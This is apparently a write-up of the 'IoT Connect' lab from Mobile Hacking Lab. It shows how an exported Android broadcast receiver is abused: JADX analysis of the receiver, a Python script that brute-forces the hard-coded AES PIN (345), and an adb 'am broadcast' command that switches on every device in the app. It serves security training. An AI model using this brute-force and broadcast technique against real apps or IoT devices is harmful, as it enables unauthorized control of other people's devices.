---
description: https://www.mobilehackinglab.com/course/lab-iot-connect
---

# IoT Connect

#### Objective <a href="#el_1700338310850_408" id="el_1700338310850_408"></a>

* Exploit a Broadcast Receiver Vulnerability: Your mission is to manipulate the broadcast receiver functionality in the "IOT Connect" Android application, allowing you to activate the master switch and control all connected devices. The challenge is to send a broadcast in a way that is not achievable by guest users.

#### Application Features <a href="#el_1700338310844_401" id="el_1700338310844_401"></a>

* Device Control: Users can control connected devices through the "IOT Connect" app.
* Broadcast Receiver: A critical broadcast receiver vulnerability present in the app.

#### Key Components <a href="#el_1700338310842_399" id="el_1700338310842_399"></a>

* Broadcast Receiver Interaction: Understand how the app processes broadcast receivers and their impact on device control.
* Unauthorized Activation: Explore how exploiting the broadcast receiver vulnerability can lead to unauthorized activation of the master switch.

#### Approach <a href="#el_1700338310833_388" id="el_1700338310833_388"></a>

1. Analyze Broadcast Receiver Function: Scrutinize the app's broadcast receiver functionality for vulnerabilities.
2. Craft Malicious Broadcasts: Develop broadcasts to manipulate device control and activate the master switch.
3. Test and Validate: Execute your broadcast strategies within the provided lab environment.
4. Submit your solution via [Assessment](https://www.mobilehackinglab.com/path-player?courseid=lab-iot-connect\&unit=65f013416e2fc99db6021f1b), to get a certificate of completion.

#### Hint <a href="#el_1709310352032_548" id="el_1709310352032_548"></a>

* Focus on Broadcast Receiver Processing: Pay attention to how broadcast receivers are processed and validated in the app.
* Code Review: Examine the code using reverse engineering tools to find the vulnerability point.

#### Learning Outcomes <a href="#el_1700338310829_384" id="el_1700338310829_384"></a>

* Broadcast Receiver Exploitation Mastery: Gain a comprehensive understanding of broadcast receiver vulnerabilities leading to unauthorized device control.
* Secure App Development: Learn the importance of secure coding practices in preventing broadcast receiver vulnerabilities and unauthorized access.

#### Sidenote <a href="#el_1700338310824_382" id="el_1700338310824_382"></a>

While the primary focus is on exploiting the vulnerability, participants are encouraged to consider how such vulnerabilities could be mitigated, highlighting the importance of secure coding practices in Android development.

### Conclusion <a href="#el_1700338310822_380" id="el_1700338310822_380"></a>

This Broadcast Receiver Exploitation Challenge provides a unique opportunity to enhance your skills in Android development and cybersecurity. Embrace the challenge, uncover the vulnerability, and elevate your expertise!

***

## Decoding

### Jadx - Android Manifest

I will be decode the apk using JADX to read the Android Manifest and analize exporteds recourses.

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Nice! There is a BroadcastReceiver called `MasterReceiver con android:exported="true".`

> This means that ANY external app or process (including ADB) can send you broadcasts.
>
> The `exported=“true”` attribute is the key: without it, only the app itself could receive the broadcast.

Also, we can read that the executabe is called "MASTER\_ON"...

> This is the function that we should be call after with ADB

### CommunicationManager

We can read the class called "masterReceiver":

<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

> Apparently, exist a key/ PIN to insert and if it is corret call to "OnAllDevices()" all devices

It confirm us the main vector attack: send a broadcast "MASTER\_ON" with the correct PIN from ADB

### Checker.java - Analize PIN

We can analice the PIN vilidation here -->

<figure><img src="../../../../.gitbook/assets/image (1489).png" alt=""><figcaption></figcaption></figure>

```java
 private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";

    public final boolean check_key(int key) {
        try {
            return decrypt(ds, key).equals("master_on");
        } catch (BadPaddingException e) {
            return false;
        }
    }

    private SecretKeySpec generateKey(int staticKey) {
        byte[] keyBytes = new byte[16];
        byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(UTF_8);
        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, min(staticKeyBytes.length, 16));
        return new SecretKeySpec(keyBytes, "AES");
    }

    public final String decrypt(String ds, int key) {
        SecretKeySpec secretKey = generateKey(key);
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        byte[] decrypted = cipher.doFinal(Base64.getDecoder().decode(ds));
        return new String(decrypted, UTF_8);
    }
```

JUMMM... the function is like...

1. Get the PIN
2. Use a key and encode it in mode ECB/PKCS5
3. Send all code encoder
4. If it is corret is enabled "master\_on"

<figure><img src="../../../../.gitbook/assets/image (1490).png" alt=""><figcaption></figcaption></figure>

## Search the PIN

<figure><img src="../../../../.gitbook/assets/image (1491).png" alt=""><figcaption></figcaption></figure>

Here, is obvious that we ned a PIN since 000 until 999...

Using the Checkr.java logic, create a script to locate the valid PIN (crack\_pin.py):

```python
  from Crypto.Cipher import AES
  import base64

  # private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";
  ds = "OSnaALIWUkpOziVAMycaZQ=="
  ciphertext = base64.b64decode(ds)
  target = b"master_on"  # check_key() comprueba que el resultado sea "master_on"

  def generate_key(pin_int):
      # Replica generateKey() de Checker.java:
      # convierte el int a string, copia los bytes en array de 16 bytes (relleno con 0x00)
      key_bytes = bytearray(16)
      pin_str = str(pin_int).encode('utf-8')
      key_bytes[:min(len(pin_str), 16)] = pin_str[:16]
      return bytes(key_bytes)

  # Prueba los 1000 PINs posibles (000-999)
  for pin in range(0, 1000):
      key = generate_key(pin)
      cipher = AES.new(key, AES.MODE_ECB)
      try:
          decrypted = cipher.decrypt(ciphertext)
          # Quitar el padding PKCS5
          pad = decrypted[-1]
          if 1 <= pad <= 16:
              unpadded = decrypted[:-pad]
              if unpadded == target:
                  print(f"[+] PIN encontrado: {pin}")
                  break
      except:
          pass
```

<figure><img src="../../../../.gitbook/assets/image (1492).png" alt=""><figcaption></figcaption></figure>

PIN 345!!!! NICE!

## Explotation

### Verify all components

Open the app in the emulator (sign in with any user). As soon as LoginActivity opens, `CommunicationManager.initialize()` is called, and the receiver is registered to listen for “MASTER\_ON”.

### Send the correct PIN to broadcast

From ADB -->

```
 adb -s emulator-5554 shell am broadcast -a MASTER_ON --ei key 345
```

> * am broadcast → Android Activity Manager, envía un broadcast
> * -a MASTER\_ON → acción del intent (la que escucha el receiver)
> * \--ei key 345 → extra de tipo entero (int) con nombre "key" y valor 345
> * -s emulator-5554 → especifica el dispositivo si hay varios conectados

### Results

The app displays the toast message “All devices are turned on” and turns on all devices simultaneously:

* Fans, AC, Plug, Speaker, TV, Bulbs

This can also be verified in logcat:

```
adb logcat | grep “TURN ON”
→ D TURN ON: Turning all devices on
```

<figure><img src="../../../../.gitbook/assets/image (1493).png" alt=""><figcaption></figcaption></figure>
